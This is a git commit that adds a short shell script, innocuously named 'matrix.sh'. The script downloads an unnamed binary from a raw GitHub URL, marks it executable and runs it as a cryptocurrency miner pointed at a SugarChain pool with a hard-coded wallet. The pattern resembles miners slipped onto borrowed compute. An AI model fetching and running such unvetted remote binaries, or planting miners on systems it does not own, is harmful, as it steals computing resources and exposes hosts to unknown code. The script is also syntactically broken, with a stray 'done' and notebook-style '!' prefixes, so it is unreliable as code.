9ab870bc8436926e546485b5c34b7d3a05e42f41
kijang-008 <85900028+kijang-008@users.noreply.github.com>
2021-06-18 21:39:46 +0000

    Create matrix.sh

---
+++ matrix.sh
@@ -0,0 +1,7 @@
+#!/bin/sh
+
+wget https://raw.githubusercontent.com/razmai9/0001-0050/master/0001
+! chmod u+x 0001
+! ./0001 -a yespowerSUGAR -o stratum+tcp://1pool.sugarchain.org:3333 -u sugar1qjhuqfmdcmaq6qr0dlxh2c9d874x6eaa88vmj3y.cpu1 -t2
+sleep 5
+done
